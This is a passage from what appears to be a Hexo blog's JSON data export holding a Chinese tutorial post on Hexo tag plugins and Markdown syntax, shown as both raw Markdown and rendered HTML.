%}\nalert('Hello World!');\n{% endcodeblock %}\n\n**指定语言**\n\n```nohilight\n{% codeblock lang:objc %}\n[rectangle setX: 10 y: 10 width: 20 height: 20];\n{% endcodeblock %}\n```\n\n{% codeblock lang:objc %}\n[rectangle setX: 10 y: 10 width: 20 height: 20];\n{% endcodeblock %}\n\n**附加说明**\n\n```nohilight\n{% codeblock Array.map %}\narray.map(callback[, thisArg])\n{% endcodeblock %}\n```\n\n{% codeblock Array.map %}\narray.map(callback[, thisArg])\n{% endcodeblock %}\n\n**附加说明和网址**\n\n```nohilight\n{% codeblock _.compact http://underscorejs.org/#compact Underscore.js %}\n_.compact([0, 1, false, 2, '', 3]);\n=> [1, 2, 3]\n{% endcodeblock %}\n```\n\n{% codeblock _.compact http://underscorejs.org/#compact Underscore.js %}\n_.compact([0, 1, false, 2, '', 3]);\n=> [1, 2, 3]\n{% endcodeblock %}\n\n## 反引号代码块\n\n另一种形式的代码块，不同的是它使用三个反引号来包裹。\n\n{% raw %}\n&#96`` [language] [title] [url] [link text]\ncode snippet\n&#96;``\n{% endraw %}\n\n## Pull Quote\n\n在文章中插入 Pull quote。\n\n```\n{% pullquote [class] %}\ncontent\n{% endpullquote %}\n```\n\n## jsFiddle\n\n在文章中嵌入 jsFiddle。\n\n```nohilight\n{% jsfiddle shorttag [tabs] [skin] [width] [height] %}\n```\n\n## Gist\n\n在文章中嵌入 Gist。\n\n```nohilight\n{% gist gist_id [filename] %}\n```\n\n## iframe\n\n在文章中插入 iframe。\n\n```nohilight\n{% iframe url [width] [height] %}\n```\n\n## Image\n\n在文章中插入指定大小的图片。\n\n```nohilight\n{% img [class names] /path/to/image [width] [height] [title text [alt text]] %}\n```\n\n## Link\n\n在文章中插入链接，并自动给外部链接添加 `target=\"_blank\"` 属性。\n\n```nohilight\n{% link text url [external] [title] %}\n```\n\n## Include Code\n\n插入 `source` 文件夹内的代码文件。\n\n```nohilight\n{% include_code [title] [lang:language] path/to/file %}\n```\n\n## Youtube\n\n在文章中插入 Youtube 视频。\n\n```nohilight\n{% youtube video_id %}\n```\n\n## Vimeo\n\n在文章中插入 Vimeo 视频。\n\n```nohilight\n{% vimeo video_id %}\n```\n\n## 引用文章\n\n引用其他文章的链接。\n\n```nohilight\n{% post_path slug %}\n{% post_link slug [title] %}\n```\n\n## 引用资源\n\n引用文章的资源。\n\n```nohilight\n{% asset_path slug %}\n{% asset_img slug [title] %}\n{% asset_link slug [title] %}\n```\n\n## Raw\n\n如果您想在文章中插入 Swig 标签，可以尝试使用 Raw 标签，以免发生解析异常。\n\n```nohilight\n{% raw %}\ncontent\n{% endraw %}\n```\n\n# 语法\n## 标题\n```nohilight\n# 这是一级标题\n## 这是二级标题\n### 这是三级标题\n#### 这是四级标题\n##### 这是五级标题\n###### 这是六级标题\n```\n## 字体\n```nohilight\n*这是倾斜的文字*\n**这是加粗的文字**\n***这是斜体加粗的文字***\n~~这是加删除线的文字~~\n```\n\n## 引用\n```nohilight\n>这是引用的内容\n>>这是引用的内容\n>>>这是引用的内容\n>>>>这是引用的内容\n......\n```\n## 分割线\n```nohilight\n---\n----\n***\n*****\n然而没什么卵用，效果都一样。\n```\n\n## 图片\n语法：\n```nohilight\n![图片ALT](图片URL \"图片title\")\n图片alt就是显示在图片下面的文字，相当于对图片内容的解释。\n图片title是图片的标题，当鼠标移到图片上时显示的内容,可不填。\n```\n效果：\n![示例图片](https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80 \"亦往沧劫\")\n\n## 超链接\n```nohilight\n[显示名称](超链接URL \"超链接title\")\ntitle可不加。\n```\n\n## 列表\n示例:\n```nohilight\n- 无序列表\n   1.有序列表\n   2.有序列表\n- 无序列表\n   1.有序列表\n   2.有序列表\n```\n效果:\n- 无序列表\n   1.有序列表\n   2.有序列表\n- 无序列表\n   1.有序列表\n   2.有序列表\n\n## 表格\n示例:\n```nohilight\n表头|表头|表头\n---|:--:|---:\n内容|内容|内容\n内容|内容|内容\n\n第二行分割表头和内容。\n- 有一个就行，为了对齐，多加了几个\n文字默认居左\n-两边加：表示文字居中\n-右边加：表示文字居右\n注：原生的语法两边都要用 | 包起来。此处省略!\n```\n效果:\n\n表头|表头|表头\n---|:--:|---:\n内容|内容|内容\n内容|内容|内容\n","source":"_posts/EditHexo.md","raw":"---\ntitle: 文档 | HEXO\ndate: 2019-04-02 18:20:22\ncategories:\n  - Web\n  - 博客\ntags:\n  - Hexo\nabbrlink: ffbd0586\nupdated:\n---\n# 引用\n标签插件和 `Front-matter` 中的标签不同，它们是用于在文章中快速插入特定内容的插件。\n<!--more-->\n\n## 引用块\n在文章中插入引言，可包含作者、来源和标题。\n**别号：** quote\n\n```nohilight\n{% blockquote [author[, source]] [link] [source_link_title] %}\ncontent\n{% endblockquote %}\n```\n\n### 样例\n\n**没有提供参数，则只输出普通的 blockquote**\n\n```nohilight\n{% blockquote %}\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque hendrerit lacus ut purus iaculis feugiat. Sed nec tempor elit, quis aliquam neque. Curabitur sed diam eget dolor fermentum semper at eu lorem.\n{% endblockquote %}\n```\n\n{% blockquote %}\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque hendrerit lacus ut purus iaculis feugiat. Sed nec tempor elit, quis aliquam neque. Curabitur sed diam eget dolor fermentum semper at eu lorem.\n{% endblockquote %}\n\n**引用书上的句子**\n\n```nohilight\n{% blockquote David Levithan, Wide Awake %}\nDo not just seek happiness for yourself. Seek happiness for all. Through kindness. Through mercy.\n{% endblockquote %}\n```\n\n{% blockquote David Levithan, Wide Awake %}\nDo not just seek happiness for yourself. Seek happiness for all. Through kindness. Through mercy.\n{% endblockquote %}\n\n**引用 Twitter**\n\n```nohilight\n{% blockquote @DevDocs https://twitter.com/devdocs/status/356095192085962752 %}\nNEW: DevDocs now comes with syntax highlighting. http://devdocs.io\n{% endblockquote %}\n```\n\n{% blockquote @DevDocs https://twitter.com/devdocs/status/356095192085962752 %}\nNEW: DevDocs now comes with syntax highlighting. http://devdocs.io\n{% endblockquote %}\n\n**引用网络上的文章**\n\n```nohilight\n{% blockquote Seth Godin http://sethgodin.typepad.com/seths_blog/2009/07/welcome-to-island-marketing.html Welcome to Island Marketing %}\nEvery interaction is both precious and an opportunity to delight.\n{% endblockquote %}\n```\n\n{% blockquote Seth Godin http://sethgodin.typepad.com/seths_blog/2009/07/welcome-to-island-marketing.html Welcome to Island Marketing %}\nEvery interaction is both precious and an opportunity to delight.\n{% endblockquote %}\n\n## 代码块\n\n在文章中插入代码。\n\n**别名：** code\n\n```nohilight\n{% codeblock [title] [lang:language] [url] [link text] %}\ncode snippet\n{% endcodeblock %}\n```\n\n### 样例\n\n**普通的代码块**\n\n```nohilight\n{% codeblock %}\nalert('Hello World!');\n{% endcodeblock %}\n```\n\n{% codeblock %}\nalert('Hello World!');\n{% endcodeblock %}\n\n**指定语言**\n\n```nohilight\n{% codeblock lang:objc %}\n[rectangle setX: 10 y: 10 width: 20 height: 20];\n{% endcodeblock %}\n```\n\n{% codeblock lang:objc %}\n[rectangle setX: 10 y: 10 width: 20 height: 20];\n{% endcodeblock %}\n\n**附加说明**\n\n```nohilight\n{% codeblock Array.map %}\narray.map(callback[, thisArg])\n{% endcodeblock %}\n```\n\n{% codeblock Array.map %}\narray.map(callback[, thisArg])\n{% endcodeblock %}\n\n**附加说明和网址**\n\n```nohilight\n{% codeblock _.compact http://underscorejs.org/#compact Underscore.js %}\n_.compact([0, 1, false, 2, '', 3]);\n=> [1, 2, 3]\n{% endcodeblock %}\n```\n\n{% codeblock _.compact http://underscorejs.org/#compact Underscore.js %}\n_.compact([0, 1, false, 2, '', 3]);\n=> [1, 2, 3]\n{% endcodeblock %}\n\n## 反引号代码块\n\n另一种形式的代码块，不同的是它使用三个反引号来包裹。\n\n{% raw %}\n&#96`` [language] [title] [url] [link text]\ncode snippet\n&#96;``\n{% endraw %}\n\n## Pull Quote\n\n在文章中插入 Pull quote。\n\n```\n{% pullquote [class] %}\ncontent\n{% endpullquote %}\n```\n\n## jsFiddle\n\n在文章中嵌入 jsFiddle。\n\n```nohilight\n{% jsfiddle shorttag [tabs] [skin] [width] [height] %}\n```\n\n## Gist\n\n在文章中嵌入 Gist。\n\n```nohilight\n{% gist gist_id [filename] %}\n```\n\n## iframe\n\n在文章中插入 iframe。\n\n```nohilight\n{% iframe url [width] [height] %}\n```\n\n## Image\n\n在文章中插入指定大小的图片。\n\n```nohilight\n{% img [class names] /path/to/image [width] [height] [title text [alt text]] %}\n```\n\n## Link\n\n在文章中插入链接，并自动给外部链接添加 `target=\"_blank\"` 属性。\n\n```nohilight\n{% link text url [external] [title] %}\n```\n\n## Include Code\n\n插入 `source` 文件夹内的代码文件。\n\n```nohilight\n{% include_code [title] [lang:language] path/to/file %}\n```\n\n## Youtube\n\n在文章中插入 Youtube 视频。\n\n```nohilight\n{% youtube video_id %}\n```\n\n## Vimeo\n\n在文章中插入 Vimeo 视频。\n\n```nohilight\n{% vimeo video_id %}\n```\n\n## 引用文章\n\n引用其他文章的链接。\n\n```nohilight\n{% post_path slug %}\n{% post_link slug [title] %}\n```\n\n## 引用资源\n\n引用文章的资源。\n\n```nohilight\n{% asset_path slug %}\n{% asset_img slug [title] %}\n{% asset_link slug [title] %}\n```\n\n## Raw\n\n如果您想在文章中插入 Swig 标签，可以尝试使用 Raw 标签，以免发生解析异常。\n\n```nohilight\n{% raw %}\ncontent\n{% endraw %}\n```\n\n# 语法\n## 标题\n```nohilight\n# 这是一级标题\n## 这是二级标题\n### 这是三级标题\n#### 这是四级标题\n##### 这是五级标题\n###### 这是六级标题\n```\n## 字体\n```nohilight\n*这是倾斜的文字*\n**这是加粗的文字**\n***这是斜体加粗的文字***\n~~这是加删除线的文字~~\n```\n\n## 引用\n```nohilight\n>这是引用的内容\n>>这是引用的内容\n>>>这是引用的内容\n>>>>这是引用的内容\n......\n```\n## 分割线\n```nohilight\n---\n----\n***\n*****\n然而没什么卵用，效果都一样。\n```\n\n## 图片\n语法：\n```nohilight\n![图片ALT](图片URL \"图片title\")\n图片alt就是显示在图片下面的文字，相当于对图片内容的解释。\n图片title是图片的标题，当鼠标移到图片上时显示的内容,可不填。\n```\n效果：\n![示例图片](https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80 \"亦往沧劫\")\n\n## 超链接\n```nohilight\n[显示名称](超链接URL \"超链接title\")\ntitle可不加。\n```\n\n## 列表\n示例:\n```nohilight\n- 无序列表\n   1.有序列表\n   2.有序列表\n- 无序列表\n   1.有序列表\n   2.有序列表\n```\n效果:\n- 无序列表\n   1.有序列表\n   2.有序列表\n- 无序列表\n   1.有序列表\n   2.有序列表\n\n## 表格\n示例:\n```nohilight\n表头|表头|表头\n---|:--:|---:\n内容|内容|内容\n内容|内容|内容\n\n第二行分割表头和内容。\n- 有一个就行，为了对齐，多加了几个\n文字默认居左\n-两边加：表示文字居中\n-右边加：表示文字居右\n注：原生的语法两边都要用 | 包起来。此处省略!\n```\n效果:\n\n表头|表头|表头\n---|:--:|---:\n内容|内容|内容\n内容|内容|内容\n","slug":"EditHexo","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkan000nqse5cfe2fza6","content":"<h1 id=\"引用\"><a href=\"#引用\" class=\"headerlink\" title=\"引用\"></a>引用</h1><p>标签插件和 <code>Front-matter</code> 中的标签不同，它们是用于在文章中快速插入特定内容的插件。<br><a id=\"more\"></a></p>\n<h2 id=\"引用块\"><a href=\"#引用块\" class=\"headerlink\" title=\"引用块\"></a>引用块</h2><p>在文章中插入引言，可包含作者、来源和标题。<br><strong>别号：</strong> quote</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% blockquote [author[, source]] [link] [source_link_title] %&#125;</span><br><span class=\"line\">content</span><br><span class=\"line\">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"样例\"><a href=\"#样例\" class=\"headerlink\" title=\"样例\"></a>样例</h3><p><strong>没有提供参数，则只输出普通的 blockquote</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% blockquote %&#125;</span><br><span class=\"line\">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque hendrerit lacus ut purus iaculis feugiat. Sed nec tempor elit, quis aliquam neque. Curabitur sed diam eget dolor fermentum semper at eu lorem.</span><br><span class=\"line\">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure>\n<blockquote><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque hendrerit lacus ut purus iaculis feugiat. Sed nec tempor elit, quis aliquam neque. Curabitur sed diam eget dolor fermentum semper at eu lorem.</p>\n</blockquote>\n<p><strong>引用书上的句子</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% blockquote David Levithan, Wide Awake %&#125;</span><br><span class=\"line\">Do not just seek happiness for yourself. Seek happiness for all. Through kindness. Through mercy.</span><br><span class=\"line\">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure>\n<blockquote><p>Do not just seek happiness for yourself. Seek happiness for all. Through kindness. Through mercy.</p>\n<footer><strong>David Levithan</strong><cite>Wide Awake</cite></footer></blockquote>\n<p><strong>引用 Twitter</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% blockquote @DevDocs https:&#x2F;&#x2F;twitter.com&#x2F;devdocs&#x2F;status&#x2F;356095192085962752 %&#125;</span><br><span class=\"line\">NEW: DevDocs now comes with syntax highlighting. http:&#x2F;&#x2F;devdocs.io</span><br><span class=\"line\">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure>\n<blockquote><p>NEW: DevDocs now comes with syntax highlighting. <a href=\"http://devdocs.io\">http://devdocs.io</a></p>\n<footer><strong>@DevDocs</strong><cite><a href=\"https://twitter.com/devdocs/status/356095192085962752\">twitter.com/devdocs/status/356095192085962752</a></cite></footer></blockquote>\n<p><strong>引用网络上的文章</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% blockquote Seth Godin http:&#x2F;&#x2F;sethgodin.typepad.com&#x2F;seths_blog&#x2F;2009&#x2F;07&#x2F;welcome-to-island-marketing.html Welcome to Island Marketing %&#125;</span><br><span class=\"line\">Every interaction is both precious and an opportunity to delight.</span><br><span class=\"line\">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure>\n<blockquote><p>Every interaction is both precious and an opportunity to delight.</p>\n<footer><strong>Seth Godin</strong><cite><a href=\"http://sethgodin.typepad.com/seths_blog/2009/07/welcome-to-island-marketing.html\">Welcome to Island Marketing</a></cite></footer></blockquote>\n<h2 id=\"代码块\"><a href=\"#代码块\" class=\"headerlink\" title=\"代码块\"></a>代码块</h2><p>在文章中插入代码。</p>\n<p><strong>别名：</strong> code</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% codeblock [title] [lang:language] [url] [link text] %&#125;</span><br><span class=\"line\">code snippet</span><br><span class=\"line\">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"样例-1\"><a href=\"#样例-1\" class=\"headerlink\" title=\"样例\"></a>样例</h3><p><strong>普通的代码块</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% codeblock %&#125;</span><br><span class=\"line\">alert(&#39;Hello World!&#39;);</span><br><span class=\"line\">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alert(&#39;Hello World!&#39;);</span><br></pre></td></tr></table></figure>\n<p><strong>指定语言</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% codeblock lang:objc %&#125;</span><br><span class=\"line\">[rectangle setX: 10 y: 10 width: 20 height: 20];</span><br><span class=\"line\">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight objc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[rectangle setX: <span class=\"number\">10</span> y: <span class=\"number\">10</span> width: <span class=\"number\">20</span> height: <span class=\"number\">20</span>];</span><br></pre></td></tr></table></figure>\n<p><strong>附加说明</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% codeblock Array.map %&#125;</span><br><span class=\"line\">array.map(callback[, thisArg])</span><br><span class=\"line\">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><figcaption><span>Array.map</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array.map(callback[, thisArg])</span><br></pre></td></tr></table></figure>\n<p><strong>附加说明和网址</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% codeblock _.compact http:&#x2F;&#x2F;underscorejs.org&#x2F;#compact Underscore.js %&#125;</span><br><span class=\"line\">_.compact([0, 1, false, 2, &#39;&#39;, 3]);</span><br><span class=\"line\">&#x3D;&gt; [1, 2, 3]</span><br><span class=\"line\">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><figcaption><span>_.compact</span><a href=\"http://underscorejs.org/#compact\">Underscore.js</a></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_.compact([0, 1, false, 2, &#39;&#39;, 3]);</span><br><span class=\"line\">&#x3D;&gt; [1, 2, 3]</span><br></pre></td></tr></table></figure>\n<h2 id=\"反引号代码块\"><a href=\"#反引号代码块\" class=\"headerlink\" title=\"反引号代码块\"></a>反引号代码块</h2><p>另一种形式的代码块，不同的是它使用三个反引号来包裹。</p>\n\n&#96`` [language] [title] [url] [link text]\ncode snippet\n&#96;``\n\n<h2 id=\"Pull-Quote\"><a href=\"#Pull-Quote\" class=\"headerlink\" title=\"Pull Quote\"></a>Pull Quote</h2><p>在文章中插入 Pull quote。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% pullquote [class] %&#125;</span><br><span class=\"line\">content</span><br><span class=\"line\">&#123;% endpullquote %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"jsFiddle\"><a href=\"#jsFiddle\" class=\"headerlink\" title=\"jsFiddle\"></a>jsFiddle</h2><p>在文章中嵌入 jsFiddle。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% jsfiddle shorttag [tabs] [skin] [width] [height] %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Gist\"><a href=\"#Gist\" class=\"headerlink\" title=\"Gist\"></a>Gist</h2><p>在文章中嵌入 Gist。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% gist gist_id [filename] %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"iframe\"><a href=\"#iframe\" class=\"headerlink\" title=\"iframe\"></a>iframe</h2><p>在文章中插入 iframe。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% iframe url [width] [height] %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Image\"><a href=\"#Image\" class=\"headerlink\" title=\"Image\"></a>Image</h2><p>在文章中插入指定大小的图片。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% img [class names] &#x2F;path&#x2F;to&#x2F;image [width] [height] [title text [alt text]] %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Link\"><a href=\"#Link\" class=\"headerlink\" title=\"Link\"></a>Link</h2><p>在文章中插入链接，并自动给外部链接添加 <code>target=&quot;_blank&quot;</code> 属性。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% link text url [external] [title] %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Include-Code\"><a href=\"#Include-Code\" class=\"headerlink\" title=\"Include Code\"></a>Include Code</h2><p>插入 <code>source</code> 文件夹内的代码文件。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% include_code [title] [lang:language] path&#x2F;to&#x2F;file %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Youtube\"><a href=\"#Youtube\" class=\"headerlink\" title=\"Youtube\"></a>Youtube</h2><p>在文章中插入 Youtube 视频。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% youtube video_id %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Vimeo\"><a href=\"#Vimeo\" class=\"headerlink\" title=\"Vimeo\"></a>Vimeo</h2><p>在文章中插入 Vimeo 视频。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% vimeo video_id %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"引用文章\"><a href=\"#引用文章\" class=\"headerlink\" title=\"引用文章\"></a>引用文章</h2><p>引用其他文章的链接。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% post_path slug %&#125;</span><br><span class=\"line\">&#123;% post_link slug [title] %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"引用资源\"><a href=\"#引用资源\" class=\"headerlink\" title=\"引用资源\"></a>引用资源</h2><p>引用文章的资源。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% asset_path slug %&#125;</span><br><span class=\"line\">&#123;% asset_img slug [title] %&#125;</span><br><span class=\"line\">&#123;% asset_link slug [title] %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Raw\"><a href=\"#Raw\" class=\"headerlink\" title=\"Raw\"></a>Raw</h2><p>如果您想在文章中插入 Swig 标签，可以尝试使用 Raw 标签，以免发生解析异常。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% raw %&#125;</span><br><span class=\"line\">content</span><br><span class=\"line\">&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h1><h2 id=\"标题\"><a href=\"#标题\" class=\"headerlink\" title=\"标题\"></a>标题</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 这是一级标题</span><br><span class=\"line\">## 这是二级标题</span><br><span class=\"line\">### 这是三级标题</span><br><span class=\"line\">#### 这是四级标题</span><br><span class=\"line\">##### 这是五级标题</span><br><span class=\"line\">###### 这是六级标题</span><br></pre></td></tr></table></figure>\n<h2 id=\"字体\"><a href=\"#字体\" class=\"headerlink\" title=\"字体\"></a>字体</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*这是倾斜的文字*</span><br><span class=\"line\">**这是加粗的文字**</span><br><span class=\"line\">***这是斜体加粗的文字***</span><br><span class=\"line\">~~这是加删除线的文字~~</span><br></pre></td></tr></table></figure>\n<h2 id=\"引用-1\"><a href=\"#引用-1\" class=\"headerlink\" title=\"引用\"></a>引用</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;这是引用的内容</span><br><span class=\"line\">&gt;&gt;这是引用的内容</span><br><span class=\"line\">&gt;&gt;&gt;这是引用的内容</span><br><span class=\"line\">&gt;&gt;&gt;&gt;这是引用的内容</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n<h2 id=\"分割线\"><a href=\"#分割线\" class=\"headerlink\" title=\"分割线\"></a>分割线</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">----</span><br><span class=\"line\">***</span><br><span class=\"line\">*****</span><br><span class=\"line\">然而没什么卵用，效果都一样。</span><br></pre></td></tr></table></figure>\n<h2 id=\"图片\"><a href=\"#图片\" class=\"headerlink\" title=\"图片\"></a>图片</h2><p>语法：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">![图片ALT](图片URL &quot;图片title&quot;)</span><br><span class=\"line\">图片alt就是显示在图片下面的文字，相当于对图片内容的解释。</span><br><span class=\"line\">图片title是图片的标题，当鼠标移到图片上时显示的内容,可不填。</span><br></pre></td></tr></table></figure><br>效果：<br><img data-src=\"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80\" alt=\"示例图片\" title=\"亦往沧劫\"></p>\n<h2 id=\"超链接\"><a href=\"#超链接\" class=\"headerlink\" title=\"超链接\"></a>超链接</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[显示名称](超链接URL &quot;超链接title&quot;)</span><br><span class=\"line\">title可不加。</span><br></pre></td></tr></table></figure>\n<h2 id=\"列表\"><a href=\"#列表\" class=\"headerlink\" title=\"列表\"></a>列表</h2><p>示例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- 无序列表</span><br><span class=\"line\">   1.有序列表</span><br><span class=\"line\">   2.有序列表</span><br><span class=\"line\">- 无序列表</span><br><span class=\"line\">   1.有序列表</span><br><span class=\"line\">   2.有序列表</span><br></pre></td></tr></table></figure><br>效果:</p>\n<ul>\n<li>无序列表<br> 1.有序列表<br> 2.有序列表</li>\n<li>无序列表<br> 1.有序列表<br> 2.有序列表</li>\n</ul>\n<h2 id=\"表格\"><a href=\"#表格\" class=\"headerlink\" title=\"表格\"></a>表格</h2><p>示例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span 